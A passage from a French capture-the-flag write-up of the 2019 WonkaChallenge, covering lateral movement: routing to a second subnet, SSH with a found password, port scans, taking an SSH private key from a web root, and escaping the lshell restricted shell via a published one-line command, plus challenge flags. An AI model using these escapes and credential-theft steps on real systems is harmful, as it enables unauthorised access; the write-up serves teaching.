</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step9_cme_veruca.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step9_cme_veruca.png, /lib/images/writeups/2019_wonkachallenge/step9_cme_veruca.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step9_cme_veruca.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step9_cme_veruca.png title=/lib/images/writeups/2019_wonkachallenge/step9_cme_veruca.png></p><h3 id=ix3-connexion-ssh-sur-le-poste-de-veruca>IX.3. Connexion SSH sur le poste de Veruca</h3><p>Les informations de Veruca sont donc les suivantes :</p><blockquote><p><a href=mailto:veruca@172.16.69.78 rel>veruca@172.16.69.78</a> : CuiiiiYEE3r3!</p></blockquote><p>Un rapide coup d&rsquo;œil sur l&rsquo;adresse IP montre qu&rsquo;elle fait partie d&rsquo;un autre réseau. Jusqu&rsquo;à présent nous étions sur le réseau <strong>172.16.42.0/24</strong>. Afin d&rsquo;accéder au second réseau, l&rsquo;ajout d&rsquo;une route est nécessaire. Comme présenté dans le schéma situé dans l&rsquo;introduction, ma route sera sur mon hôte Windows 10 :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>HoteWin10<span class=o>)</span> ➜ route print <span class=p>|</span>findstr 10.8.0.10
</span></span><span class=line><span class=cl>         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>         10.8.0.8  255.255.255.252         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>        10.8.0.10  255.255.255.255         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>        10.8.0.11  255.255.255.255         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>        224.0.0.0        240.0.0.0         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>  255.255.255.255  255.255.255.255         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>HoteWin10<span class=o>)</span> ➜ route ADD 172.16.69.0 MASK 255.255.255.0 10.8.0.9
</span></span><span class=line><span class=cl> OK!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>HoteWin10<span class=o>)</span> ➜ route print <span class=p>|</span>findstr 10.8.0.10
</span></span><span class=line><span class=cl>         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>         10.8.0.8  255.255.255.252         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>        10.8.0.10  255.255.255.255         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>        10.8.0.11  255.255.255.255         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>      172.16.69.0    255.255.255.0         10.8.0.9        10.8.0.10     <span class=m>36</span>
</span></span><span class=line><span class=cl>        224.0.0.0        240.0.0.0         On-link         10.8.0.10    <span class=m>291</span>
</span></span><span class=line><span class=cl>  255.255.255.255  255.255.255.255         On-link         10.8.0.10    <span class=m>291</span>
</span></span></code></pre></td></tr></table></div></div><p>Il est désormais possible de se connecter en SSH à la machine de Veruca avec mes VM en NAT :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ ssh veruca@172.16.69.78                                                                                        
</span></span><span class=line><span class=cl>veruca@172.16.69.78<span class=err>&#39;</span>s password: 
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ veruca@SRV01-WEB-WW3:~$ whoami
</span></span><span class=line><span class=cl>veruca
</span></span><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ veruca@SRV01-WEB-WW3:~$ hostname
</span></span><span class=line><span class=cl>SRV01-WEB-WW3
</span></span><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ veruca@SRV01-WEB-WW3:~$ ip a
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc pfifo_fast state UP group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/ether 7a:0a:61:1a:36:65 brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>    inet 172.16.69.78/24 brd 172.16.69.255 scope global ens18
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step9_flag.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step9_flag.png, /lib/images/writeups/2019_wonkachallenge/step9_flag.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step9_flag.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step9_flag.png title=/lib/images/writeups/2019_wonkachallenge/step9_flag.png></p><h3 id=ix4-flag>IX.4. Flag</h3><blockquote><p>83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2</p></blockquote><hr><h3 id=resources-7>Resources</h3><ol><li><strong>Paul Lammertsma</strong>, <em>Where does WinSCP store site&rsquo;s password?</em>, SuperUser : <a href=https://superuser.com/questions/100503/where-does-winscp-store-sites-password target=_blank rel="noopener noreffer">https://superuser.com/questions/100503/where-does-winscp-store-sites-password</a></li><li><strong>anoopengineer</strong>, <em>WinSCP Password Extractor/Decrypter/Revealer</em>, GitHub : <a href=https://github.com/anoopengineer/winscppasswd/ target=_blank rel="noopener noreffer">https://github.com/anoopengineer/winscppasswd/</a></li><li><strong>Vivek Gite</strong>, <em>Linux route Add Command Examples</em>, cyberciti : <a href=https://www.cyberciti.biz/faq/linux-route-add/ target=_blank rel="noopener noreffer">https://www.cyberciti.biz/faq/linux-route-add/</a></li><li><strong>Walter Glenn</strong>, <em>How to Add a Static TCP/IP Route to the Windows Routing Table</em>, howtogeek : <a href=https://www.howtogeek.com/howto/windows/adding-a-tcpip-route-to-the-windows-routing-table/ target=_blank rel="noopener noreffer">https://www.howtogeek.com/howto/windows/adding-a-tcpip-route-to-the-windows-routing-table/</a></li></ol><hr><hr><h2 id=x-step-10---the-great-escape>X. Step 10 - The Great Escape</h2><blockquote><p>Run Otman run, get out of this jail!</p></blockquote><h3 id=tldr-9>TL;DR</h3><ol><li>Trouver l&rsquo;autre machine via ARP : <code>cat /proc/net/arp</code> ;</li><li>Remarquer que <strong>nginx</strong> est installé ;</li><li>Dans la configuration du nginx, trouver la racine du <em>frontend</em> : <code>/usr/share/nginx/dev3.challenge.akerva.com</code> ;</li><li>Récupérer une clé privée SSH dans l&rsquo;un des dossiers ;</li><li>Grâce à l&rsquo;indice de Akerva, on connait l&rsquo;utilisateur de la machine distante : <strong>violet</strong> ;</li><li>Atterrir dans un environnement restreint : <strong>lshell</strong> ;</li><li>Trouver l&rsquo;issue de sécurité sur le git permettant de s&rsquo;échapper de l&rsquo;environnement restreint : <code>echo opmd && cd () bash && cd</code>.</li></ol><hr><h3 id=x1-reconnaissance>X.1. Reconnaissance</h3><p>Personnellement, l&rsquo;un de mes premiers reflexes en post exploitation est de vérifier le cache <strong>arp</strong> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ cat /proc/net/arp 
</span></span><span class=line><span class=cl>IP address       HW <span class=nb>type</span>     Flags       HW address            Mask     Device
</span></span><span class=line><span class=cl>172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
</span></span><span class=line><span class=cl>172.16.69.65     0x1         0x2         96:2e:20:a6:a0:f3     *        ens18
</span></span></code></pre></td></tr></table></div></div><p>Une nouvelle IP a été trouvé : <code>172.16.69.65</code>. Il n&rsquo;est pas possible de ré-utiliser les identifiants de Veruca sur cette IP. Pour vérifier les différents services sur ces machines, il est nécessaire de faire un scan de port complet.</p><h4 id=x1a-172166965>X.1.a. 172.16.69.65</h4><p>Pour des soucis de rapidité, j&rsquo;ai préféré utiliser <strong>masscan</strong> plutôt que nmap.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate <span class=m>700</span> 172.16.69.65           
</span></span><span class=line><span class=cl>Discovered open port 22/tcp on 172.16.69.65                                                                     
</span></span></code></pre></td></tr></table></div></div><p>Un service sur le port 22 est disponible, le SSH en question. Il n&rsquo;y a pas d&rsquo;autres services.</p><h4 id=x1b-172166978-srv01-web-ww3>X.1.b. 172.16.69.78 (SRV01-WEB-WW3)</h4><p>La machine <em>SRV01-WEB-WW3</em> a un service de plus exposé :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate <span class=m>700</span> 172.16.69.78            
</span></span><span class=line><span class=cl>Discovered open port 80/tcp on 172.16.69.78                                    
</span></span><span class=line><span class=cl>Discovered open port 22/tcp on 172.16.69.78                                    
</span></span></code></pre></td></tr></table></div></div><h3 id=x2-connexion-ssh-au-serveur-distant>X.2. Connexion SSH au serveur distant</h3><p>Etant donné qu&rsquo;un service web est exposé et qu&rsquo;un accès ssh est disponible, il est possible de lister directement le contenu de <code>/var/www/html</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ ls /var/www/html
</span></span><span class=line><span class=cl>index.html  index.nginx-debian.html
</span></span></code></pre></td></tr></table></div></div><p>À première vue, le serveur utilisé est un <em>nginx</em>. Il est possible de vérifier la configuration du serveur et des différents sites dans le dossier <code>/etc/nginx/sites-available</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ ls /etc/nginx/sites-available
</span></span><span class=line><span class=cl>default  dev3.challenge.akerva.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ cat /etc/nginx/sites-available/dev3.challenge.akerva.com
</span></span><span class=line><span class=cl>server <span class=o>{</span>
</span></span><span class=line><span class=cl>	server_name dev3.challenge.akerva.com<span class=p>;</span>
</span></span><span class=line><span class=cl>	listen 80<span class=p>;</span>
</span></span><span class=line><span class=cl>	listen <span class=o>[</span>::<span class=o>]</span>:80<span class=p>;</span>
</span></span><span class=line><span class=cl>	root /usr/share/nginx/dev3.challenge.akerva.com<span class=p>;</span>
</span></span><span class=line><span class=cl>	index index.html index.php<span class=p>;</span>
</span></span><span class=line><span class=cl>	autoindex off<span class=p>;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	add_header X-Frame-Options SAMEORIGIN<span class=p>;</span>
</span></span><span class=line><span class=cl>	add_header X-Content-Type-Options nosniff<span class=p>;</span>
</span></span><span class=line><span class=cl>	add_header X-XSS-Protection <span class=s2>&#34;1; mode=block&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	location / <span class=o>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=o>(</span>-f /usr/share/nginx/dev3.challenge.akerva.com/error/index.html<span class=o>){</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> 503<span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=o>}</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	location  ~ /<span class=se>\.</span><span class=o>{</span>
</span></span><span class=line><span class=cl>		deny all<span class=p>;</span>
</span></span><span class=line><span class=cl>		access_log off<span class=p>;</span>
</span></span><span class=line><span class=cl>		log_not_found off<span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=c1>#Error pages</span>
</span></span><span class=line><span class=cl>	error_page <span class=m>503</span> /index.html<span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>location</span> <span class=o>=</span> /index.html <span class=o>{</span>
</span></span><span class=line><span class=cl>		root /usr/share/nginx/dev3.challenge.akerva.com/error/<span class=p>;</span>
</span></span><span class=line><span class=cl>		internal<span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	location ~ ^/.*<span class=se>\.</span>php <span class=o>{</span>
</span></span><span class=line><span class=cl>            try_files <span class=nv>$uri</span> <span class=o>=</span>503<span class=p>;</span>
</span></span><span class=line><span class=cl>            include fastcgi_params<span class=p>;</span>
</span></span><span class=line><span class=cl>            fastcgi_pass unix:/run/php/php7.3-fpm.sock<span class=p>;</span>
</span></span><span class=line><span class=cl>            fastcgi_split_path_info ^/<span class=o>(</span>.+<span class=se>\.</span>php<span class=o>)(</span>/.*<span class=o>)</span>$<span class=p>;</span>
</span></span><span class=line><span class=cl>            fastcgi_index index.php<span class=p>;</span>
</span></span><span class=line><span class=cl>            fastcgi_param HTTPS on<span class=p>;</span>
</span></span><span class=line><span class=cl>            fastcgi_param SCRIPT_FILENAME <span class=nv>$document_root$fastcgi_script_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            fastcgi_param PATH_INFO <span class=nv>$fastcgi_path_info</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            fastcgi_intercept_errors on<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Plusieurs informations intéressantes se trouvent dans ce fichier, dont la racine du site web : <code>/usr/share/nginx/dev3.challenge.akerva.com</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com
</span></span><span class=line><span class=cl>total <span class=m>24</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> root     root     <span class=m>4096</span> juil.  <span class=m>5</span> 11:08 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>5</span> root     root     <span class=m>4096</span> juin  <span class=m>21</span> 18:42 ..
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> juin  <span class=m>26</span> 17:01 error
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> juil.  <span class=m>4</span> 10:52 golden_tickets
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> juin  <span class=m>26</span> 18:02 keys
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> juil.  <span class=m>5</span> 11:08 scripts
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>SRV01-WEB-WW3<span class=o>)</span> ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com/keys
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> www-data www-data <span class=m>4096</span> juin  <span class=m>26</span> 18:02 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> root     root     <span class=m>4096</span> juil.  <span class=m>5</span> 11:08 ..
</span></span><span class=line><span class=cl>-rw-r----- <span class=m>1</span> www-data www-data <span class=m>1679</span> juin  <span class=m>26</span> 18:02 id_rsa
</span></span></code></pre></td></tr></table></div></div><p>Une clé privée SSH est disponible dans l&rsquo;arborescence du <em>frontend</em>. La connexion à l&rsquo;autre machine doit être possible avec cette clé. Il ne manque que l&rsquo;utilisateur associé. La clé privée est disponible <a href=https://mega.nz/#!Lj4DlAqD!QCLeAbjrbXU5QkCT8pGOXATWDV4jNjv4wuKc_nKoc9w target=_blank rel="noopener noreffer">ici</a>.</p><p>La plateforme de challenge du <a href=https://challenge.akerva.com target=_blank rel="noopener noreffer">WonkaChall</a> propose un hint par épreuve. Pour cette étape, le hint est le nom de l&rsquo;utilisateur, à savoir <strong>violet</strong>.</p><p>Connaissant le nom de l&rsquo;utilisateur et la clé associée, il est possible de se connecter au serveur distant :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step10_lshell.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step10_lshell.png, /lib/images/writeups/2019_wonkachallenge/step10_lshell.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step10_lshell.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step10_lshell.png title=/lib/images/writeups/2019_wonkachallenge/step10_lshell.png></p><h3 id=x3-escaping-the-restricted-shell>X.3. Escaping the restricted shell</h3><p>Dans la réalité, le shell restreint n&rsquo;est pas apparu directement. En utilisant <em>zsh</em>, j&rsquo;ai rencontré un soucis (dont j&rsquo;ignore totalement la cause). Par contre, cela m&rsquo;a permis d&rsquo;accéder à l&rsquo;erreur suivante :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ ssh violet@172.16.69.65 -i /home/maki/Documents/wonkachall2019/step10/id_rsa
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Linux SRV02-BACKUP 4.9.0-9-amd64 <span class=c1>#1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class=line><span class=cl>permitted by applicable law.
</span></span><span class=line><span class=cl>You have new mail.
</span></span><span class=line><span class=cl>Last login: Fri Jul <span class=m>19</span> 11:36:53 <span class=m>2019</span> from 10.8.0.14
</span></span><span class=line><span class=cl>Traceback <span class=o>(</span>most recent call last<span class=o>)</span>:
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/usr/bin/lshell&#34;</span>, line 52, in &lt;module&gt;
</span></span><span class=line><span class=cl>    main<span class=o>()</span>
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/usr/bin/lshell&#34;</span>, line 38, in main
</span></span><span class=line><span class=cl>    <span class=nv>userconf</span> <span class=o>=</span> CheckConfig<span class=o>(</span>args<span class=o>)</span>.returnconf<span class=o>()</span>
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py&#34;</span>, line 69, in _init_
</span></span><span class=line><span class=cl>    self.get_global<span class=o>()</span>
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py&#34;</span>, line 145, in get_global
</span></span><span class=line><span class=cl>    self.config.read<span class=o>(</span>self.conf<span class=o>[</span><span class=s1>&#39;configfile&#39;</span><span class=o>])</span>
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py&#34;</span>, line 697, in <span class=nb>read</span>
</span></span><span class=line><span class=cl>    self._read<span class=o>(</span>fp, filename<span class=o>)</span>
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py&#34;</span>, line 1027, in _read
</span></span><span class=line><span class=cl>    <span class=k>for</span> lineno, line in enumerate<span class=o>(</span>fp, <span class=nv>start</span><span class=o>=</span>1<span class=o>)</span>:
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/usr/lib/python2.7/encodings/ascii.py&#34;</span>, line 26, in decode
</span></span><span class=line><span class=cl>    <span class=k>return</span> codecs.ascii_decode<span class=o>(</span>input, self.errors<span class=o>)[</span>0<span class=o>]</span>
</span></span><span class=line><span class=cl>UnicodeDecodeError: <span class=s1>&#39;ascii&#39;</span> codec can<span class=err>&#39;</span>t decode byte 0xc2 in position 2854: ordinal not in range<span class=o>(</span>128<span class=o>)</span>
</span></span><span class=line><span class=cl>Connection to 172.16.69.65 closed.
</span></span></code></pre></td></tr></table></div></div><p>Grâce à l&rsquo;erreur python trouvée, très explicite, il me fût facile de tomber sur le <a href=https://github.com/ghantoos/lshell target=_blank rel="noopener noreffer">GitHub</a> de lshell. Pour s&rsquo;évader de ce shell restreint, le plus simple reste d&rsquo;inspecter les différentes <em>issues</em> de sécurité du dépôt. Actuellement, il n&rsquo;y a qu&rsquo;une issue de securité active : <a href=https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754 target=_blank rel="noopener noreffer">https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754</a></p><p>L&rsquo;utilisateur <strong>omega8cc</strong> mentionne un moyen de s&rsquo;échapper fonctionnel :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP lshell<span class=o>)</span> ➜ <span class=nb>echo</span> FREEDOM! <span class=o>&amp;&amp;</span> <span class=nb>cd</span> <span class=o>()</span> bash <span class=o>&amp;&amp;</span> <span class=nb>cd</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step10_escapeshell.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step10_escapeshell.png, /lib/images/writeups/2019_wonkachallenge/step10_escapeshell.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step10_escapeshell.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step10_escapeshell.png title=/lib/images/writeups/2019_wonkachallenge/step10_escapeshell.png></p><p>Le flag est situé dans le <em>home</em> de <strong>violet</strong> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as violet<span class=o>)</span> ➜ cat /etc/passwd<span class=p>|</span>grep violet
</span></span><span class=line><span class=cl>violet❌1000:1000:violet,,,:/home/violet:/usr/bin/lshell
</span></span><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as violet<span class=o>)</span> ➜ ls /home/violet
</span></span><span class=line><span class=cl>flag-10.txt
</span></span><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as violet<span class=o>)</span> ➜ cat /home/violet/flag-10.txt
</span></span><span class=line><span class=cl>d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
</span></span></code></pre></td></tr></table></div></div><h3 id=x4-flag>X.4. Flag</h3><blockquote><p>d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865</p></blockquote><hr><h3 id=resources-8>Resources</h3><ol><li><strong>ghantoos</strong>, <em>lshell - SECURITY ISSUE: Inappropriate parsing of command syntax</em>, GitHub : <a href=https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754 target=_blank rel="noopener noreffer">https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754</a></li></ol><hr><hr><h2 id=xi-step-11---free-flag>XI. Step 11 - Free flag</h2><blockquote><p>Free for all \o/</p></blockquote><h3 id=tldr-10>TL;DR</h3><ol><li>Remarquer qu&rsquo;il existe des fichiers world readable dans le <strong>/home</strong> du système ;</li><li>Lire la clé privée de l&rsquo;utilisateur <strong>Georgina</strong> ;</li><li>Se connecter avec cette clé privée et accéder au <em>home</em> de Georgina.</li></ol><hr><h3 id=xi1-trouver-la-clé-privé>XI.1. Trouver la clé privé</h3><p>Étant connecté sur un système avec un utilisateur &ldquo;standard&rdquo;, naturellement je regarde s&rsquo;il m&rsquo;est possible d&rsquo;accéder aux <em>home</em> des autres utilisateurs du système. C&rsquo;est comme cela que 